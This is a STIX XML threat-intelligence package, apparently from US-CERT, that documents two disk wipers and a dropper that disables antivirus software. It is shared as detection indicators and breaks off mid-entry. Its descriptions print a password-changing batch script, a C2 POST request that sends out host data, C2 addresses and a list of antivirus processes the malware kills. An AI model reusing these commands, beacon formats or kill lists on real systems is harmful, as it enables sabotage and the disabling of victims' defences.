@@ -1,0 +1,463 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:NetworkConnectionObj="http://cybox.mitre.org/objects#NetworkConnectionObject-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:SocketAddressObj="http://cybox.mitre.org/objects#SocketAddressObject-1" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:PortObj="http://cybox.mitre.org/objects#PortObject-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-13-10538" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Anaylsis of Disk Wipers and Security Application Disabler</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 28 AUGUST 2013 three files were identified and submitted for analysis. Two files are disk wipers and send user information to two command and control domains. The third file is a dropper, that drops a security application disabler and POSTs to one command and control domain.
+
+
+This document incorporates data originally released as US-CERT MIFR-309794.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-09-10T17:55:33Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-f292123f-225a-427e-abb0-a4f73fdd3949" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-8648125a-4c05-4946-8237-0926efe650b3"/>
+        <indicator:Indicator idref="CISCP:indicator-182e2448-d0ad-4c13-80c9-10f842ef24a2"/>
+        <indicator:Indicator idref="CISCP:indicator-a63943cd-88b8-45f2-ade7-e15d9a81a800"/>
+        <indicator:Indicator idref="CISCP:indicator-25fecc69-7c3d-42a4-ac49-10355939a3ca"/>
+        <indicator:Indicator idref="CISCP:indicator-444c7292-0182-4344-b673-62950a89739f"/>
+        <indicator:Indicator idref="CISCP:indicator-85f93eae-f71d-4e4c-a3a2-0b7dd8230daa"/>
+        <indicator:Indicator idref="CISCP:indicator-eb9c7686-7307-4501-bc5d-df43750e0cdd"/>
+        <indicator:Indicator idref="CISCP:indicator-e805de0e-e485-4f07-b850-061281b8ce6d"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8648125a-4c05-4946-8237-0926efe650b3" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file is a disk wiper capable of opening the physical disk and writing data to it. This malware also has the capability to call back to the IP addresses "210.127.39.29" and "112.217.190.218", perform service manipulation and changing user account passwords. The following actions were observed during run&#8208;time analysis:
+
+Checks to see if the file path "C:\WINDOWS\system32\icfg\lsass.exe" exists.
+
+A new thread is created beginning at offset 0x00403960. This thread performs the
+following actions:
+The following IP addresses are built:
+210.127.39.29
+112.217.190.218
+
+A socket is created and a connection is established with the IP address "112.217.190.218" via port 8080. The file then sends encoded data that contains the host system information via the socket. The thread then exits. A new thread is created beginning at offset 0x00404370. This thread performs the following actions:
+
+The malware executes itself with the following command line:
+"%Path to Executable%\MD5__0708a979a5c7c3a0450b7ddc37faead7.e__ &#8208;b" 
+
+Another attempt is made by the malware to execute itself with a different command line option (see below). However, the second attempt to preceded by the malware attempting to enable the "SeDebugPrivilege". This would allow the new process to manipulate the memory regions of running processes. The thread then exits.
+
+"%Path to Executable%\MD5__0708a979a5c7c3a0450b7ddc37faead7.e__ &#8208;n"
+
+The malware attempts to open services named "Sens" and "Alerter". It sends a "STOP_SERVICE" request to both services if they are running on the host. A new file is created in the user's %TEMP% directory with the file extension ".tmp.bat". The file name is created dynamically at run&#8208;time. The content of the file is displayed below:
+net user Administrator "highanon2013"
+del "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\57D8.tmp.bat"
+
+The first command changes the login password for the user account "Administrator" to "highanon2013". The second command deletes the batch file. The malware has a capability to open the physical disk containing the host file system and overwrite the physical disk with data. This procedure cripples the victim host preventing it from being able to operate and eventually crashes.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-e2fb8a62-f404-4121-a0b9-b58bded9267f">
+        <cybox:Object id="CISCP:Object-4131b8b3-a97a-443f-83f5-f5385306356f">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">MD5__bb27e1fa93b87b02401729c8a5af29df.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">245760</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">bb27e1fa93b87b02401729c8a5af29df</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4b96a216f7bb634912a6f543b33c3e9afb4ca15e</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b8a151e8ce695d078cd2fdc91fff86364a36c953786944f7321fea491d51289f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:wW/oLDWtTBfSzINP4zdYnD7RU1LjUkhLtHCoholosWHtSFNEGU00P97Y:h/CDWtTB6YDtoPholhWHtyKrhY</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-182e2448-d0ad-4c13-80c9-10f842ef24a2" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The submitted file is a variant of the submitted file "MD5__0708a979a5c7c3a0450b7ddc37faead7.e__". The functionality is similar and the configuration data is the same.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a7c54d4d-935b-4a1b-944d-e353eb7a9426">
+        <cybox:Object id="CISCP:Object-92a37a30-ee6e-465b-9917-79f92ac6091b">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">MD5__0708a979a5c7c3a0450b7ddc37faead7.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">245760</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">0708a979a5c7c3a0450b7ddc37faead7</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">5d8ab36290bc97dc73fa3e786aa72e0adf9c8194</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:wW/oLDWtTBfSzINP4zdVFxtyAGWh1znD7RU1LjUkhLtHCoholosWHtSFNEGU00P2:h/CDWtTB6VF6AvbzDtoPholhWHtyKrhY</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-a63943cd-88b8-45f2-ade7-e15d9a81a800" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file acts as a dropper for two embedded files: a DLL and a driver file. The submitted executable is UPX packed. The subsequent analysis was performed on the unpacked version of the executable.
+
+When executed, the file performs the following actions on the victim host:
+The file "c:\WINDOWS\Tasks\sa01.dat" is deleted.
+The file "c:\WINDOWS\setupball.bmp" is created. The Dll file contained in the resource labeled "130" is written to the file. This procedure also contains a procedure to write the drive file contained in the resource labeled "133" to "c:\WINDOWS\system32\drivers\ahnurl.sys".
+
+The file writes data to three initialization files. The file names and data written are below:
+File: version.dat
+Data: version=1000
+File: winurl.dat
+Data: status=1
+File: wintmp.dat
+Data: data=0
+
+The file "c:\WINDOWS\system32\oleautmp.dat" is deleted.
+The following registry value is deleted from the victim host to eliminate the auto&#8208;run setting for AhnLab antivirus software.
+
+Key: \\HKLM\Microsoft\Windows\CurrentVersion\Run
+Value: "AhnLab V3Lite Tray Process"
+
+A batch file is created in the user's %TEMP% directory. The file name begins with "del" and is followed by a random string. The content of the batch file is below:
+
+attrib.exe &#8208;h C:\WINDOWS\system32\olesau32.dll
+ren C:\WINDOWS\system32\olesau32.dll olesautmp.dat :Repeat
+del "C:\Documents and Settings\Administrator\Desktop\DSC_UP0399.JPGX"
+if exist "C:\Documents and Settings\Administrator\Desktop\DSC_UP0399.JPGX" goto
+Repeat
+del "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\del1f737fc6.bat"
+
+The batch file will enable the "Hidden" file attribute for the file
+"C:\WINDOWS\system32\olesau32.dll", delete the dropper "DSC_UP0399.JPGX" and itself.
+RELEVANT RESOURCE DATA &#8208;&#8208;&#8208;&#8208;&#8208;&gt;
+Name: MYDLL
+Label: 130
+Content:
+This resource contains a Dll file with the MD5 hash:
+08263E911B711868B1FC76EC8C1206BD
+Label: 133
+Content:
+This resource contains a driver with the MD5 hash: BE25D2E6DA3AA38D0CA9444C9AE15ABE</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-57585e27-0e48-47ff-b9ac-9c5ed8f4b281">
+        <cybox:Object id="CISCP:Object-41391fea-f957-4427-914d-95800317ae5f">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">DSC_UP0399.JPGX</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">245760</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6437ad4ddd822a46411a23a56477773f</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">76d27a9592c8ab7633c07e2bd20fc06bf05ab345</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:VN//6TMCPBVVWWQmMQZPJWRFNLN5a5uH/E8qL+1c1NXPbRJzXyqE9sAolmNttxwK:V1/EPt1g9LN5a5uflqL+1c1YzmctJ</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-25fecc69-7c3d-42a4-ac49-10355939a3ca" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This residual DLL file is embedded in the file "DSC_UP0399.JPGX". This Dll is used as a check against certain security software suites such as AhnLab. It also calls back to the URL "www.kaonola.com".
+
+The file name is based on the resource it is contained in. When executed, the DLL performs the following actions on the victim host:
+
+The DLL queries the values of the following registry keys:
+\\HKLM\SoftWare\Microsoft\InternetExplorer\Version
+\\HKCU\Software\DNF\Path (Game software)
+\\HKLM\Software\Wizet\MapleStory\ExecPath (Game software)
+\\HKLM\SOFTWARE\NC Soft\Lineage\ExecutePath (Game software)
+
+The OS version is enumerated by the DLL by querying the following registry keys:
+SoftWare\\Microsoft\\Windows NT\\CurrentVersion\CurrentVersion
+SoftWare\\Microsoft\\Windows NT\\CurrentVersion\CSDVersion
+
+The DLL calls back to the URL "www.kaonola.com" with the following POST request:
+
+POST /up/board.asp HTTP/1.1
+Content&#8208;Type: application/x&#8208;www&#8208;form&#8208;urlencoded
+Accept&#8208;Charset: UTF&#8208;8
+Accept&#8208;Language: ko
+User&#8208;Agent: NateOn/3.8.14.2(994)
+Host: www[.]kaonola.com
+Cache&#8208;Control: no&#8208;cache
+Content&#8208;Length: 174
+area=&amp;uid=6&amp;full=&amp;pwd=5%2E1%5FSP3&amp;wp=&amp;wf=&amp;r=&amp;rp=&amp;sp=000000000000000000000&amp;lck=&amp;lg=&amp;l
+v=0&amp;my=0&amp;pc=000C29141F5A&amp;n=0&amp;plen=0&amp;llen=0&amp;ulen=0&amp;bp=&amp;ver=V2016&amp;weburl=www%2Ekaonola
+%2Ecom
+
+The DLL checks to see if it is running under any of the following processes:
+explorer.exe
+iexplore.exe
+
+NOTE: If the Dll finds that it is running under "iexplore.exe" it launches a routine to parse the Internet cache entries and delete any entries containing the following strings: "ahnLabKeyCrypt.js" and "aosmgr_common.js".
+
+The DLL looks for the Global Atom
+"Global\\winntxp&#8208;3452333&#8208;AD336&#8208;434F&#8208;933A7&#8208;33344F27AE8CC76". If the atom is not present, the DLL adds it.
+
+The DLL performs a series of checks for software created by AhnLabs. The following Registry keys are queried:
+\\SOFTWARE\AhnLab\V3Lite\InstallPath
+\\SOFTWARE\AhnLab\V3 365 Clinic\InstallPath
+\\SOFTWARE\ESTsoft\ALYac\ProductPath
+\\SOFTWARE\ESTsoft\ALYac\RootDir
+\\SOFTWARE\NHN Corporation\NaverVaccine\InstallDir
+
+The running processes are parsed for the following file names:
+V3LTray.exe
+V3LSvc.exe
+V3Light.exe
+V3LRun.exe
+
+If any of the following process names are found, the Dll terminates the process:
+V3LTray.exe
+V3LSvc.exe
+V3Light.exe
+V3LRun.exe
+MUpdate2.exe
+
+The Dll is also capable of deleting files associated with the AhnLabs software. The following registry value is deleted if it exists in the registry to thwart persistence of the AhnLabs software:
+\\Software\Microsoft\Windows\CurrentVersion\Run\AhnLab V3Lite Tray Process</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-6cc9cfbf-f3d5-4ba1-9535-50fab0a895b2">
+        <cybox:Object id="CISCP:Object-c3d1630d-14ac-49f1-8745-76675d494714">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">MYDLL_130.dll</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">163840</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">08263e911b711868b1fc76ec8c1206bd</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3e121ac2ccc1e66f8afd7ca1101e8c3489124f13</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">9759209c51d9f3aea7636072a90d5e3473a18692b548c836deb80dcdf5d49c19</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:wCPBVVWWQmMQZPJWRFNLN5a5uH/E8qL+1c1NXPbRJzXyqE9sAolmNttxw:jPt1g9LN5a5uflqL+1c1Yzmct</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-444c7292-0182-4344-b673-62950a89739f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The residual driver file is embedded in the submitted file "DSC_UP0399.JPGX". This file is used to kill anti&#8208;virus and other security applications on the victim host.
+
+It also has the ability to hook the following API's:
+NtMapViewofSection
+ZwEnumerateKey
+ZwEnumerateValueKey
+ZwMapViewofSection
+ZwQueryDirectoryFile
+
+The following is a list of process names the driver parses for and is capable of terminating:
+AvastSvc.exe
+avsx.exe
+AvastUI.exe
+ashUpd.exe
+avp.exe
+ASDCr.exe
+ASDCli.exe
+ASDUp.exe
+V3LNetdn.exe
+V3LiteExp.exe
+ASDSvc.exe
+V3LSvc.exe
+V3LTray.exe
+V3Light.exe
+V3Medic.exe
+V3LRun.exe
+MUpdate2.exe
+AYRTSrv.exe
+AYUpdSrv.exe
+AYAgent.exe
+AYRTSrv.aye
+AYServiceNT.aye
+AYAgent.aye
+AYUpdSrv.aye
+ALYac.aye
+AYUpdate.aye
+Nsavsvc.npc
+Nsvmon.npc
+NVCAgent.npc
+Nsavsvc.exe
+Nsvmon.exe
+NVCAgent.exe
+NVCUpgrader.exe
+NaverAgent.exe
+NVCUpgrader.npc
+
+This driver file is installed on the victim host under a service called "ahnurl". The service points to the file path: "c:\WINDOWS\system32\drivers\ahnurl.sys"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-448de763-4568-4236-90d3-488e6b684034">
+        <cybox:Object id="CISCP:Object-e25ad0da-a4a1-4a9b-87a8-77958de36d9b">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">ahnurl.sys</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">36096</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">be25d2e6da3aa38d0ca9444c9ae15abe</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">650fd8dd9929013a61dceac3c6a2e04fff6338e1</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:MMOx6of+wSEDikCUb3dz1h2Fb1h+btWUefBGKXAWGI:8/+whrxtz1Ih1h+bPef85u</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-85f93eae-f71d-4e4c-a3a2-0b7dd8230daa" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This POST request is initiated by "MYDLL_130.dll".
+
+-----BEGIN POST REQUEST-----
+POST /up/board.asp HTTP/1.1
+Content&#8208;Type: application/x&#8208;www&#8208;form&#8208;urlencoded
+Accept&#8208;Charset: UTF&#8208;8
+Accept&#8208;Language: ko
+User&#8208;Agent: NateOn/3.8.14.2(994)
+Host: www.kaonola.com
+Cache&#8208;Control: no&#8208;cache
+Content&#8208;Length: 174
+area=&amp;uid=6&amp;full=&amp;pwd=5%2E1%5FSP3&amp;wp=&amp;wf=&amp;r=&amp;rp=&amp;sp=000000000000000000000&amp;lck=&amp;lg=&amp;l
+v=0&amp;my=0&amp;pc=000C29141F5A&amp;n=0&amp;plen=0&amp;llen=0&amp;ulen=0&amp;bp=&amp;ver=V2016&amp;weburl=www%2Ekaonola
+%2Ecom
+----END POST REQUEST-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-2bec0879-eedc-48c6-9ef5-b2a31bd18b17">
+        <cybox:Object id="CISCP:Object-42d55e64-8af0-4269-bc30-c78fd4e1fc5f">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://www.kaonola.com/up/board.asp/</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-28T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-eb9c7686-7307-4501-bc5d-df43750e0cdd" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This is a network connection initiated by "MD5__bb27e1fa93b87b02401729c8a5af29df.exe" and "MD5__0708a979a5c7c3a0450b7ddc37faead7.exe" via port 8080. The file then sends encoded data that contains the host system information via the socket.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-b364f038-d7ef-4609-8a4f-eaf5b08af533">
+        <cybox:Object id="CISCP:Object-fb37c930-a449-461f-b3e7-b7320ac0a7f2">
